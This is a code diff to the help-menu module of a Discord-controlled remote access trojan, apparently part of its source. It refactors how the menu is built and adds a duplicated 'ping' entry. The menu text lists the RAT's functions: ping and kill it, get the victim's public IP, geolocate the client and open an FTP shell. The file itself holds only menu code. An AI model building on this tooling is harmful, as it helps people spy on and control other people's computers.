@@ -8,14 +8,18 @@ class Command:
         self.usage = usage
 
 class Menu:
-    def __init__(self) -> None:
-        self.helpMenu = {
-            "ping": Command("See if the RAT is running in this channel\n + Some small **latency info**", (34, 218, 25)),
-            "kill": Command("**Kill** the RAT", (224, 27, 27), ["stop"]),
-            "ip": Command("Get the **public IP** address of the client", (216, 25, 218), ["ipconfig", "ipinfo", "viewip", "showip"]),
-            "info": Command("Get all **information** about the client", (227, 222, 15), ["geolocate", "geolocation", "infomenu"]),
-            "ftp": Command("Get an **FTP+ shell** from the client", (15, 227, 143), ["ftp+", "ftpshell", "shellftp"])
-        }
+    def __init__(self, commands:dict=None) -> None:
+        if commands == None:
+            self.helpMenu = {
+                "ping": Command("This **help menu**"),
+                "ping": Command("See if the RAT is running in this channel\n + Some small **latency info**", (34, 218, 25)),
+                "kill": Command("**Kill** the RAT", (224, 27, 27), ["stop"]),
+                "ip": Command("Get the **public IP** address of the client", (216, 25, 218), ["ipconfig", "ipinfo", "viewip", "showip"]),
+                "info": Command("Get all **information** about the client", (227, 222, 15), ["geolocate", "geolocation", "infomenu"]),
+                "ftp": Command("Get an **FTP+ shell** from the client", (15, 227, 143), ["ftp+", "ftpshell", "shellftp"])
+            }
+        else:
+            self.helpMenu = commands
         self.allAliases = {}
         for cmd in self.helpMenu.keys():
             for alias in self.helpMenu[cmd].aliases:
@@ -28,7 +32,7 @@ class Menu:
             color=discord.Color.from_rgb(10, 196, 247)
         ).set_footer(text="Run 'help <COMMAND>' for more information")
     
-    def displayForCommand(self, cmd) -> discord.Embed:
+    def displayForCommand(self, cmd: str) -> discord.Embed:
         if cmd not in self.helpMenu.keys():
             if cmd not in self.allAliases.keys():
                 return discord.Embed(
